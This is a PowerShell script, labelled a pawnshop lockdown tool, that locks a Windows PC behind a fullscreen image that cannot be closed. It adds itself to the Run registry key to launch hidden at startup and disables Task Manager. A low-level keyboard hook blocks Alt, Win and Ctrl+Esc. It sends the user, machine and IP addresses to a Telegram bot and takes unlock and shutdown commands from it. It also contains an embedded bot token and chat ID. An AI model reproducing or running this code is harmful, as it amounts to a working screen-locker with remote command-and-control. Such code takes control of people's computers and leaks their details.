# Pawnshop Lockdown Script - Displays fullscreen image & locks PC, with Telegram remote control

# --- Configuration ---
$ImageUrl  = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$BotToken  = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$ChatID    = "656189986"

# Identify PC/User
$Username  = [Environment]::UserName
$Computer  = [Environment]::MachineName

# Lock state file (created automatically)
$LockFile  = "C:\lock_status.txt"
if (-not (Test-Path $LockFile)) { "locked" | Out-File $LockFile -Force }

# Set registry startup (only when running from file, otherwise skip)
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunValueName = "PawnShopLock"
if ($MyInvocation.MyCommand.Path) {
    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Set-ItemProperty $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
}

# Disable Task Manager
New-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "DisableTaskMgr" -Value 1 -Type DWord -Force

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Keyboard hook to block ALT+F4, ALT, CTRL+ESC, WIN keys
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyHook {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hook = IntPtr.Zero;
    private delegate IntPtr HookProc(int n, IntPtr wp, IntPtr lp);
    private static HookProc proc = HookCallback;
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, HookProc proc, IntPtr h, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr wp, IntPtr lp);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    public static void Start() { hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0); }
    public static void Stop() { UnhookWindowsHookEx(hook); }
    private static IntPtr HookCallback(int n, IntPtr wp, IntPtr lp) {
        if (n >= 0 && (wp == (IntPtr)WM_KEYDOWN || wp == (IntPtr)WM_SYSKEYDOWN)) {
            Keys key = (Keys)Marshal.ReadInt32(lp);
            bool alt = Control.ModifierKeys.HasFlag(Keys.Alt);
            bool ctrl = Control.ModifierKeys.HasFlag(Keys.Control);
            if (alt && key == Keys.F4) return (IntPtr)1; // Block Alt+F4
            if (alt || key == Keys.LWin || key == Keys.RWin || (ctrl && key == Keys.Escape))
                return (IntPtr)1;
        }
        return CallNextHookEx(hook, n, wp, lp);
    }
}
"@
[KeyHook]::Start()

# Download image
try {
    $web = New-Object Net.WebClient
    $image = [Drawing.Image]::FromStream([IO.MemoryStream]($web.DownloadData($ImageUrl)))
} catch {
    $bmp = New-Object Drawing.Bitmap(1920,1080)
    [Drawing.Graphics]::FromImage($bmp).Clear('Black')
    $image = $bmp
}

# Fullscreen forms on all monitors
$forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle='None';WindowState='Maximized';TopMost=$true;Bounds=$screen.Bounds;KeyPreview=$true;Cursor=[Windows.Forms.Cursors]::None
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{Image=$image;Dock='Fill';SizeMode='Zoom'}
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel=$true } })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# Telegram notification
$ipLocal = (Get-NetIPAddress -AF IPv4 |?{$_.IPAddress -notmatch'^127|169'}|Select -First 1 -ExpandProperty IPAddress)
try { $ipPublic = Invoke-RestMethod 'https://api.ipify.org' } catch { $ipPublic = 'Unknown' }
$msg = "Pawnshop PC Locked:`nUser: $Username`nComputer: $Computer`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n/unlock$Username`n/shutdown$Username`n/lock$Username"
Invoke-RestMethod "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body (@{chat_id=$ChatID;text=$msg}|ConvertTo-Json) -ContentType 'application/json'

# Telegram listener
$offset = 0; $script:AllowClose=$false
$timer = New-Object Windows.Forms.Timer -Property @{Interval=3000}
$timer.Add_Tick({
    try {
        $resp=Invoke-RestMethod "https://api.telegram.org/bot$BotToken/getUpdates?offset=$offset"
        foreach($update in $resp.result){
            $offset=$update.update_id+1
            $txt=$update.message.text.ToLower().Trim()
            switch ($txt) {
                "/unlock$($Username.ToLower())" {
                    "unlocked"|Out-File $LockFile -Force
                    Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
                    $script:AllowClose=$true; [Windows.Forms.Application]::Exit()
                }
                "/shutdown$($Username.ToLower())" {
                    Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
                    Stop-Computer -Force
                }
                "/lock$($Username.ToLower())" {
                    "locked"|Out-File $LockFile -Force
                }
            }
        }
    }catch{}
})
$timer.Start()

# Application loop
[Windows.Forms.Application]::Run()

# Cleanup on exit
$timer.Stop()
[KeyHook]::Stop()
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" "DisableTaskMgr" 0 -Force
